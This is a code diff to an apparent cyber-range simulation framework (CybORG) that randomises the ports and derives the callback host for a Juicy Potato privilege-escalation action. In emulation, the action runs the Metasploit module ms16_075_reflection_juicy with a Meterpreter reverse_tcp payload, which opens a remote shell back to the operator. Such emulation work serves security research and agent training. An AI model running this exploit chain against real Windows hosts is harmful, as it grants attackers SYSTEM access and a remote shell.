@@ -7,6 +7,7 @@ pertaining to the Juicy Potato permissions escalation action
 # pylint: disable=invalid-name
 from typing import Tuple
 from ipaddress import IPv4Address
+from random import randint
 
 from CybORG.Shared import Observation
 from CybORG.Shared.Actions.MSFActionsFolder.MSFPrivilegeEscalationFolder.MSFPrivilegeEscalation import MSFPrivilegeEscalation
@@ -127,14 +128,15 @@ class MSFJuicyPotato(MSFPrivilegeEscalation):
                                                 user=root_user.username, session_type="meterpreter", parent=server_session)
 
         local_port = target_host.get_ephemeral_port()
+        lport = randint(4400,45000)
         new_connection = {"remote_port": local_port,
                                   "Application Protocol": "tcp",
                                   "remote_address": server_address,
-                                  "local_port": 4445,
+                                  "local_port": lport,
                                   "local_address": str(self.ip_address)
                                   }
         state.hosts[new_session.host].get_process(new_session.pid).connections.append(new_connection)
-        remote_port = {"remote_port": 4445,
+        remote_port = {"remote_port": lport,
                                "Application Protocol": "tcp",
                                "local_address": server_address,
                                "remote_address": str(self.ip_address),
@@ -169,7 +171,12 @@ class MSFJuicyPotato(MSFPrivilegeEscalation):
             obs.set_success(False)
             return obs
         session = list(sessions.keys())[0]
-        output = session_handler.execute_module(mtype='exploit', mname='windows/local/ms16_075_reflection_juicy', opts={'RHOSTS': str(self.ip_address), 'SESSION': session}, payload_name='windows/x64/meterpreter/reverse_tcp', payload_opts={'LHOST': "10.46.64.10", 'LPORT': 4445})
+        # get LHOST from the session tunnel_local
+        #print("target session {}".format(sessions[session]))
+        lhost = self.get_lhost(sessions[session]["tunnel_local"])
+        lport = randint(4400,4500)
+
+        output = session_handler.execute_module(mtype='exploit', mname='windows/local/ms16_075_reflection_juicy', opts={'RHOSTS': str(self.ip_address), 'SESSION': session}, payload_name='windows/x64/meterpreter/reverse_tcp', payload_opts={'LHOST': lhost, 'LPORT': lport})
         obs.add_raw_obs(output)
         obs.set_success(False)
         session_handler._log_debug(output)
